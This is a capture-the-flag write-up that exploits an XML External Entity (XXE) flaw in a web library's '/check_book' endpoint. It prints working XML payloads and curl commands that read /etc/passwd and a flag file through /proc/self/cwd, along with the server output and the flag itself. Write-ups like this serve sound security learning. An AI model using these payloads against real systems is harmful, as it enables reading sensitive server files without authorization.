# Capybara Library CTF Write-up

## Challenge Description
> The old librarian Capybara hid a secret scroll in the system but forgot where. They say he left a clue in the server itself... somewhere in a forgotten file.
>
> Targets: http://31.129.105.124 or http://155.212.135.246

## Methodology

### 1. Initial Reconnaissance
Upon visiting the web application at the provided URL, we are greeted with the "Capy-City Library" interface. The main functionality allows checking the availability of a book by its ID.

Inspecting the frontend source code (specifically the JavaScript used to submit the book ID), we can see that it constructs an XML payload and sends it via a `POST` request to the `/check_book` endpoint:

```javascript
// Example from the frontend code
const xmlData = `<?xml version="1.0" encoding="UTF-8"?>
<book>
    <id>${id}</id>
</book>`;

fetch('/check_book', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/xml'
    },
    body: xmlData
})
```

### 2. Identifying the Vulnerability (XXE)
Since the application accepts XML input and parses it, we can test for XML External Entity (XXE) injection.
We can craft a payload that defines an external entity pointing to a local file on the server. If the server is vulnerable, it will resolve the entity and reflect the file contents in the response.

We tested this by attempting to read `/etc/passwd`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<book>
    <id>&xxe;</id>
</book>
```

Sending this payload via `curl` returned the contents of the `/etc/passwd` file in the response, confirming the XXE vulnerability:
```bash
$ curl -s -X POST -H "Content-Type: application/xml" -d @payload.xml http://31.129.105.124/check_book
Результат поиска: root:x:0:0:root:/root:/bin/bash
...
```

### 3. Exploitation and Finding the Flag
The challenge description mentioned a "secret scroll" hidden in a "forgotten file" on the server.

We experimented with reading various files such as `/proc/version`, `/etc/os-release`, and `/app/requirements.txt`.
When attempting to read `/flag.txt`, the server returned an error indicating the file was not found or empty.

Next, we tried referencing files relative to the application's current working directory using `/proc/self/cwd/`. We crafted a payload to read `flag.txt` from the application's directory (`/proc/self/cwd/flag.txt`):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///proc/self/cwd/flag.txt"> ]>
<book>
    <id>&xxe;</id>
</book>
```

Submitting this payload yielded the flag:
```bash
$ curl -s -X POST -H "Content-Type: application/xml" -d @payload.xml http://31.129.105.124/check_book
Результат поиска: capyCTF{xxe_1s_v3ry_c0mmon_1n_capy_l1brary}
```

## Flag
`capyCTF{xxe_1s_v3ry_c0mmon_1n_capy_l1brary}`
